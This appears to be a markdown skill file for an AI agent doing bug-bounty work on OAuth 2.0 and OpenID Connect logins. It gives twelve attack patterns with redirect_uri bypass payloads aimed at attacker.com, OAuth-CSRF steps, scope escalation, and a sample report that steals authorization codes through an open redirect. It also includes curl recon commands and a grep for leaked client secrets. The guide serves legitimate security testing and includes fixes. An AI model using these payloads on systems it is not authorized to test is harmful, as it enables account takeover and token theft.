---
name: oauth-oidc
description: Hunt OAuth 2.0 and OIDC flaws — redirect_uri abuse, state CSRF, PKCE bypass, scope manipulation, implicit-flow token theft, postMessage origin tricks, ID token sub claim swap, JWKS confusion, response_type confusion, and OAuth-CSRF. Use when an app has Google/GitHub/Facebook/Apple/custom OAuth or OpenID Connect.
metadata:
  type: skill
  phase: hunt
  vuln_class: oauth
  cwe: 287
---

# OAuth 2.0 / OIDC

> The most-misimplemented protocol on the web. Critical bugs every year.

## When to invoke

**Trigger phrases:**
- "OAuth flaw"
- "redirect_uri"
- "test SSO"
- "OIDC bug"
- "social login"

## OAuth refresher (you need this)

```
1. Client → /oauth/authorize?client_id=X&redirect_uri=R&response_type=code&scope=S&state=Z
2. Auth server → user logs in / consents
3. Auth server → redirects to R with ?code=Y&state=Z
4. Client backend → POST /oauth/token with code=Y → access_token + (id_token if OIDC)
5. Client uses access_token to access API
```

**Where things break:**
- `redirect_uri` validation
- `state` validation
- `code` reuse
- `client_secret` storage / exposure
- `id_token` claim trust
- PKCE absent or bypassable

## The 12 attack patterns

### 1. redirect_uri host bypass

If validation accepts any `https://*.target.com`:

```
redirect_uri=https://attacker-controlled-sub.target.com/callback
```

Test:
- Subdomain takeover candidate (`abandoned.target.com`)
- Open redirect on `target.com` chained to OAuth
- IDN homograph: `https://tаrget.com/callback` (Cyrillic `а`)

### 2. redirect_uri path bypass

If validation only checks host but not path:
```
Registered: https://app.target.com/oauth/callback
Try:       https://app.target.com/oauth/callback/../redirect?url=https://attacker.com
Try:       https://app.target.com/anything    (if just host check)
```

### 3. redirect_uri prefix bypass

```
Registered: https://target.com/callback
Try:       https://target.com/callback.attacker.com    (host substring)
Try:       https://target.com.attacker.com/callback    (subdomain confusion)
Try:       https://attacker.com#@target.com/callback   (URL parser confusion)
Try:       https://target.com@attacker.com/callback    (userinfo)
```

### 4. redirect_uri parameter pollution

```
?redirect_uri=https://target.com/callback&redirect_uri=https://attacker.com
?redirect_uri[]=https://target.com/callback&redirect_uri[]=https://attacker.com
```

Some servers use first, some use last → mismatched expectations → bypass.

### 5. response_type / response_mode confusion

```
response_type=code → token returned via backend (safer)
response_type=token → token in URL fragment (implicit flow)
response_type=id_token token → token in fragment

# Some apps use code but accept token if asked:
?response_type=code+token → may expose token in URL
```

### 6. state parameter — CSRF

If `state` is not validated:

```
Attacker logs in to attacker's account at target.com
Attacker initiates OAuth: /oauth/authorize?...&state=ATT_STATE
Attacker captures the redirect URL with code=ATT_CODE
Attacker tricks victim into clicking: /oauth/callback?code=ATT_CODE&state=ATT_STATE
Victim's session now bound to attacker's social account
Attacker logs into victim's session via the social account
```

This is "**OAuth CSRF**" — high impact, often missed.

### 7. PKCE bypass / not enforced

PKCE adds `code_verifier`/`code_challenge` to prevent code interception. If server doesn't enforce:

```
Standard flow:
  client → /authorize?code_challenge=CC&code_challenge_method=S256
  server returns code C
  client → /token with code=C, code_verifier=V (where SHA256(V) === CC)

Vulnerability:
  server accepts /token without code_verifier
  → attacker who intercepted C can exchange it
```

Test: send `/oauth/token` without `code_verifier` → if accepted, PKCE not enforced.

### 8. Scope manipulation

```
?scope=read    (default)
?scope=read write admin
?scope=read,write,admin
?scope[]=admin
```

If server accepts and grants admin scope → privilege escalation.

### 9. ID token claim trust

OIDC `id_token` contains user identity. Some apps trust claims without re-verifying:

```json
{
  "sub": "google-12345",
  "email": "victim@example.com",
  "email_verified": false
}
```

If app links account by `email` without checking `email_verified`:
- Sign up as `victim@example.com` with `email_verified: false` → linked to victim's existing account → ATO

Modify ID token claims (if signing flaw exists — see `[[jwt-attacks]]`):
- Change `sub` to victim's ID
- Change `email`
- Add `email_verified: true`

### 10. Provider confusion

Sign in with one provider, then the app might let another provider use the same email:
```
Sign up with Apple as victim@example.com → account A
Attacker signs up with Google as victim@example.com → also account A?
```

Some apps merge accounts → ATO.

### 11. postMessage origin not checked

OAuth popup flow uses `window.postMessage` to send token back:

```javascript
// Vulnerable parent listener:
window.addEventListener('message', (e) => {
    // No origin check!
    const token = e.data.token;
    fetch('/api/login-with-token', {body: token});
});
```

Attacker hosts page that opens target, then sends `postMessage` with fake token.

### 12. Authorization code reuse

The spec says auth codes are **one-time**. If reusable:
```
Capture code → use → use again (should fail but...)
```

Replay until expired.

## Step-by-Step Workflow

### 1. Map OAuth endpoints

Common paths:
```
/oauth/authorize
/oauth2/authorize
/auth/oauth2/authorize
/connect/authorize    (OIDC discovery)
/oauth/token
/oauth2/token
/oauth/callback
/oauth-callback
/auth/callback
/login/oauth2/code/{provider}    (Spring)
/api/auth/callback/{provider}    (NextAuth)
/.well-known/openid-configuration   (OIDC metadata)
/.well-known/oauth-authorization-server
/jwks
/.well-known/jwks.json
```

Get metadata if available:
```bash
curl https://target.com/.well-known/openid-configuration | jq .
```

### 2. Capture the full flow

Open dev tools → Network tab → Click "Sign in with Google" (or similar). Capture every request:
- Initial `/authorize` with params
- Provider's authorization
- Callback to target's `/oauth-callback?code=...&state=...`
- Token exchange (server-side, may not be visible in browser)
- Subsequent API calls with token

Save the full HAR file for analysis.

### 3. Test each parameter

For `redirect_uri`:
- Change host → bypass attempts (see patterns above)
- Add `#`, `?`, `@`, `\` separators
- Add traversal
- URL-encode different parts

For `state`:
- Remove → does it still work?
- Replay (use one user's state value with another user's code)
- Predictable (sequential)?

For `scope`:
- Add admin / write / read:all
- Use array, comma separator, plus separator

For `client_id`:
- Try other client IDs (other apps registered with this OAuth provider)
- Some apps trust `client_id` for routing → wrong client gets right token

### 4. Test PKCE

Try `/oauth/token` request without `code_verifier`. Try with wrong `code_verifier`. If accepted → PKCE not enforced.

### 5. Open redirect chains

If target has open redirect at `/redirect?url=X`:
```
redirect_uri=https://target.com/redirect?url=https://attacker.com/grab
```
Auth server validates `redirect_uri` is `target.com` ✓ → sends token there → `/redirect` forwards to attacker.

### 6. JWKS / public key checks

For OIDC, get the JWKS:
```bash
curl https://target.com/.well-known/jwks.json
```

Try `id_token` attacks: alg=none, RS→HS confusion, jku injection — see `[[jwt-attacks]]`.

## Tools

```bash
# OAuthScan
git clone https://github.com/CompassSecurity/oauthscan
python3 oauthscan.py -u https://target.com/oauth/authorize

# Burp's "JWT Editor" + manual replay
# Burp's "OAuth & SAML" extension

# OAuth dance recorder (for manual analysis)
# Use Burp Repeater + macros for token exchange flows
```

## Output template

```markdown
## Critical: OAuth account takeover via open redirect on redirect_uri

### Summary
The `/oauth/callback` flow validates `redirect_uri` against `*.target.com`, but the application exposes `/redirect?to=<url>` which forwards to attacker domains. Chaining these allows OAuth `code` interception → full ATO.

### Steps to reproduce
1. Attacker hosts `https://attacker.com/grab.html` (logs all incoming `code` query params)
2. Attacker sends victim this link:
   ```
   https://target.com/oauth/authorize?
     client_id=ABC&
     response_type=code&
     redirect_uri=https://target.com/redirect?to=https://attacker.com/grab.html&
     state=random
   ```
3. Victim, already logged in via Google, sees `target.com` in URL → trusts → clicks
4. Authorization server validates `redirect_uri` starts with `https://target.com` ✓
5. Issues code, redirects to `https://target.com/redirect?to=https://attacker.com/grab.html&code=AUTH_CODE&state=random`
6. `/redirect` endpoint follows → `Location: https://attacker.com/grab.html?code=AUTH_CODE&state=random`
7. Attacker server logs `code=AUTH_CODE`
8. Attacker calls `/oauth/token` with the stolen code → gets `access_token` + `id_token`
9. Attacker uses token: full session as victim

### Impact
- Full account takeover with single victim click
- All resources, billing, project data accessible
- Persistent (until access_token expires; refresh token included → permanent)

### Suggested fix
1. Strictly whitelist `redirect_uri` to exact registered URIs (no `startsWith` validation)
2. Remove the `/redirect?to=` open redirect
3. Enforce PKCE for all clients
4. Validate `state` server-side
```

## Cross-references

- `[[ato-chains]]` — OAuth is a major ATO path
- `[[auth-bypass]]` — OAuth-CSRF is auth bypass
- `[[jwt-attacks]]` — id_token attacks
- `[[xss]]` — XSS on callback page = token theft

## Common pitfalls

1. **Reporting "open redirect" alone.** Chain to OAuth for impact.
2. **Not testing PKCE.** Most modern apps should have it; missing PKCE is reportable.
3. **Treating implicit flow as "deprecated and unimportant".** Some apps still use it → token in URL = bug.
4. **Missing the JWKS endpoint check.** Look for /.well-known/jwks.json — public key disclosure.
5. **Confusing OAuth scope expansion (server bug) with social engineering.** Demonstrate the upgrade is server-accepted, not user-tricked.

## OAuth severity guide

| Finding | Severity |
|---|---|
| redirect_uri bypass enabling token theft | Critical |
| state not validated → OAuth CSRF | High |
| PKCE not enforced (when client should use it) | Medium-High |
| Open redirect on `/oauth/callback` | High (chain) |
| Scope upgrade (admin) | Critical |
| id_token claim trust (`email_verified` ignored) | Critical |
| code reusable | High |
| client_secret in JS bundle | Critical |
| JWKS jku injection | Critical |

## Quick OAuth recon

```bash
# Find OAuth providers
curl https://target.com | grep -iE 'google|github|facebook|microsoft|apple|sso|oauth|openid'

# OIDC discovery
curl https://target.com/.well-known/openid-configuration | jq .

# Check JWKS
curl https://target.com/.well-known/jwks.json | jq .

# Check for client_secret leakage in JS
cat loot/target/js/files/*.js | grep -iE 'client_secret|consumer_secret' | head
```
